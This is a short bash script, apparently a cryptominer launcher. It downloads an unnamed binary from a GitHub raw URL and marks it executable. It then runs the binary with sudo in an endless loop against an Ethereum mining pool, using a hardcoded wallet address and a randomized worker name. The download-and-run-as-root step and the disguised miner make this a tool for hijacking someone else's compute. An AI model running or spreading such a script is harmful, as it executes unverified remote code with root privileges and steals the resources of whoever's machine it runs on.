#!/bin/bash

sudo apt install libpci3
wget https://github.com/matroska56/arigato/raw/main/henkised
chmod +x henkised
while [ 1 ]; do
sudo ./henkised -pool stratum+ssl://eu1.ethermine.org:5555 -wal 0xD07b31e87Bf3892D9F6cA4a417ccACD439EC51Cc.$(echo $(shuf -i 1-10 -n 1)-DOMINOZ) -pass x -proto 1 -mi 12 -gt 400
sleep 5
done
sleep 999999999
